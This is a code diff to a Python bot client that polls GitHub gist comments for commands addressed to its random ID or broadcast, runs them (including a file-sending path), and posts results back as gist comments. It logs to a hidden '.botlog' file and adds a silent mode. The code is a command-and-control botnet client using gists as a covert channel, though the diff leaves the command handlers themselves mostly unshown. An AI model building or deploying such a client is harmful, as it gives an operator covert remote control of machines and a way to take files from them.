@@ -1,18 +1,20 @@
+import argparse
 import sys
 import random
 import time
 import utils
 from utils import Command
+import log
 
-REFRESH_DELAY = 360  # 6 minutes
+SHOW_INFO = True
+LOGFILE = '.botlog'
 
 BOT_ID = 0
-LOG = []
 LAST_COMMENT = 0
 
 
 def error(cmd, data, r):
-    return "ERROR: " + str(cmd) + "\ndata: " + data + "\nr: " + str(r)
+    return "ERROR"
 
 
 def handle_command(cmd, data, r):
@@ -31,39 +33,35 @@ def handle_command(cmd, data, r):
         else:
             out = send_file(data)
 
-    LOG.append(out)
-    if r: return respond(out)
+    log.add_log_entry(SHOW_INFO, LOGFILE, log.CommandAndResponse(cmd, data, r, out))
+    if r: return respond(cmd, out, r)
     return out
 
 
-def respond(data):
-    comment = parse_response(data)
+def respond(cmd, out, r):
+    comment = construct_response(BOT_ID, cmd, out, r)
     return utils.post_gist_comment(comment)
 
 
 # TODO rework
-def parse_response(data):
-    return str(BOT_ID) + '\n' + data
-
-
-# TODO rework
-# TODO check if parsable
-def parse_command(comment):
-    bot, cmd, d, r = comment.split('\n')[:4]
-    bot = int(bot)
-    cmd = Command[cmd]
-    r = bool(int(r))
-    return bot, cmd, d, r
+def construct_response(bot, cmd, out, r):
+    return utils.DELIM \
+        + str(int(False)) + utils.DELIM \
+        + str(bot) + utils.DELIM \
+        + cmd.name + utils.DELIM \
+        + out + utils.DELIM \
+        + str(int(r)) + utils.DELIM
 
 
 def check_for_commands():
     global LAST_COMMENT
     data, LAST_COMMENT = utils.get_fresh_comments(LAST_COMMENT)
+    log.add_log_entry(SHOW_INFO, LOGFILE, log.CheckForCommands(len(data)))
     
     handled = 0
     for comment in data:
-        bot, cmd, d, r = parse_command(comment['body'])
-        if bot == utils.BROADCAST or bot == BOT_ID:
+        isctrl, bot, cmd, d, r = utils.parse_msg(comment['body'])
+        if isctrl and (bot == utils.BROADCAST or bot == BOT_ID):
             handle_command(cmd, d, r)
             handled += 1
     return handled
@@ -74,10 +72,25 @@ def send_file():
     return None
 
 
+def main():
+    global LAST_COMMENT
+    LAST_COMMENT = utils.get_last_comment_id()
+    log.add_log_entry(SHOW_INFO, LOGFILE, log.InitEntry(LAST_COMMENT))
+
+    while True:
+        if SHOW_INFO: print("SLEEP\n")
+        time.sleep(utils.REFRESH_DELAY)
+        check_for_commands()
+
+
 if __name__ == "__main__":
     BOT_ID = random.randint(1, sys.maxsize)
     utils.init_config()
 
-    while True:
-        time.sleep(REFRESH_DELAY)
-        check_for_commands()
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-s', '--silent', action='store_true')
+    
+    args = parser.parse_args()
+    if args.silent: SHOW_INFO = False
+
+    main()
